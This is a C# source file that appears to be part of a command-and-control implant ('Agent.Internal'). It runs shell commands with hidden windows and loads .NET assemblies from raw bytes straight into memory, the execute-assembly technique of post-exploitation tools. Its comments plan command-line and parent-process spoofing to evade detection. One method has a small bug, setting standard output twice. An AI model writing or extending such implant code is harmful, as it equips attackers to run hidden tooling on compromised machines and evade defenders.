using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;

namespace Agent.Internal
{
    public static class Execute
    {
        public static string ExecuteCommand(string fileName, string arguments)
        {
            //TODO: spoof commandline args here
            //TODO: spoof parent process here
            var startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            string output = "";

            var process = new Process
            {
                StartInfo = startInfo
            };

            process.OutputDataReceived += (_, e) => { output += e.Data; };
            process.ErrorDataReceived += (_, e) => { output += e.Data; };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();
            return output;
        }

        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
        {
            if (arguments == null)
            {
                arguments = new string[] { };
            }

            var currentOut = Console.Out;
            var currentError = Console.Error;

            var ms = new MemoryStream();
            var sw = new StreamWriter(ms)
            {
                AutoFlush = true
            };

            Console.SetOut(sw);
            Console.SetOut(sw);

            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { arguments });

            Console.Out.Flush();
            Console.Error.Flush();

            var output = Encoding.UTF8.GetString(ms.ToArray());

            Console.SetOut(currentOut);
            Console.SetError(currentError);

            sw.Dispose();
            ms.Dispose();

            return output;
        }
    }
}
